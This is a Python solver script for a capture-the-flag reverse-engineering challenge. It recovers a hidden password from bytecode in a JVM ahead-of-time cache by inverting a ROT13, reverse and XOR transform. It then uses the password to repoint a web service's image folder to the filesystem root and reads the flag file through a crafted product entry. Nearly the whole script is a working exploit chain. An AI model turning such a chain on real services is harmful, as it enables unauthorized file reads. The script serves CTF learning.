#!/usr/bin/env python3
"""
Solver for the `leftovers` reverse-engineering challenge.

The JAR's `Server.lambda$main$15` looks like a straight equality check against
`"supersecret"`, but the deployed AOT cache (cache.aot) has replaced that
41-byte method body with a 321-byte version that does:

    arr = password.toCharArray()
    for c in arr: if c not in '0'..'9': c = ROT13(c)         # transform
    reverse(arr)                                              # reverse
    for i in 0..len: arr[i] ^= STATIC_ARR_1[i]                # xor
    return Arrays.equals(STATIC_ARR_2, arr)

`STATIC_ARR_1` and `STATIC_ARR_2` are baked into the bytecode as a series
of `bipush`/`sipush ... castore` instructions. Inverting the four-step
transform recovers `algomaster99`, which unlocks `/set-image-dir` to point
the image folder at `/`. From there, adding any Product named `flag` lets
`GET /images/flag` read the actual flag file.
"""

import json
import sys
import urllib.error
import urllib.request

# Lifted straight from the bytecode of the substituted lambda$main$15
# (file offset 0x1f0c680 inside cache.aot — see lambda_main_15_constmethod.bin).
STATIC_ARR_1 = [233, 202, 85, 61, 72, 144, 198, 179, 218, 190, 240, 59]
STATIC_ARR_2 = [208, 243, 48, 79, 47, 246, 168, 201, 184, 202, 137, 85]


def rot13(c: int) -> int:
    """ROT13 the way the cached bytecode does it: digits 0-9 pass through; for
    every other char, compute `((c - 'a' + 13) % 26) + 'a'`, then truncate via
    i2b and re-cast via i2c. ROT13 is its own inverse for letters."""
    if ord("0") <= c <= ord("9"):
        return c
    v = c - ord("a") + 13
    # Java's `%` keeps the sign of the dividend, so emulate that:
    v_mod = v - (v // 26) * 26 if v >= 0 else -((-v) % 26) if (-v) % 26 else 0
    r = v_mod + ord("a")
    r &= 0xFF                       # i2b: low 8 bits
    if r >= 0x80:
        r -= 0x100                  # i2b: sign-extend
    return r & 0xFFFF               # i2c: low 16 bits, unsigned


def forward(password: str) -> list[int]:
    arr = [rot13(ord(c)) for c in password]
    arr.reverse()
    return [arr[i] ^ STATIC_ARR_1[i] for i in range(len(arr))]


def derive_password() -> str:
    # Invert step by step.
    after_xor = STATIC_ARR_2[:]                                  # arr == STATIC_ARR_2
    after_reverse = [c ^ STATIC_ARR_1[i]                          # undo XOR
                     for i, c in enumerate(after_xor)]
    after_rot13 = after_reverse[::-1]                             # undo reverse
    original = [rot13(c) for c in after_rot13]                    # undo ROT13
    return "".join(chr(c) for c in original)


def main() -> None:
    pw = derive_password()
    print(f"Derived password: {pw!r}")
    assert forward(pw) == STATIC_ARR_2, "forward verification failed"
    print("Forward verification: OK")

    if len(sys.argv) < 2:
        print("Pass an instance URL to also fetch the flag, e.g.:")
        print(f"  {sys.argv[0]} https://<instance>.gpn24.ctf.kitctf.de")
        return

    base = sys.argv[1].rstrip("/")

    def post(path: str, body: dict) -> tuple[int, str]:
        req = urllib.request.Request(
            f"{base}{path}",
            method="POST" if "set-image-dir" in path else "PUT",
            headers={"Content-Type": "application/json"},
            data=json.dumps(body).encode(),
        )
        try:
            with urllib.request.urlopen(req) as r:
                return r.status, r.read().decode()
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode()

    status, _ = post("/set-image-dir", {"password": pw, "newPath": "/"})
    print(f"set-image-dir → {status}")
    assert status == 200, "unlock failed"

    # The image download will 404, but ImageStore.addImage runs *after*
    # State.products.add(product), so the Product is registered regardless.
    post("/products/flag", {
        "product": {
            "name": "flag",
            "quantity": 1,
            "bestBefore": "2030-01-01T00:00:00",
            "notAfter": "2030-01-01T00:00:00",
        },
        "imageUrl": "http://example.invalid/x.png",
    })

    with urllib.request.urlopen(f"{base}/images/flag") as r:
        flag = r.read().decode().strip()
    print(f"Flag: {flag}")


if __name__ == "__main__":
    main()
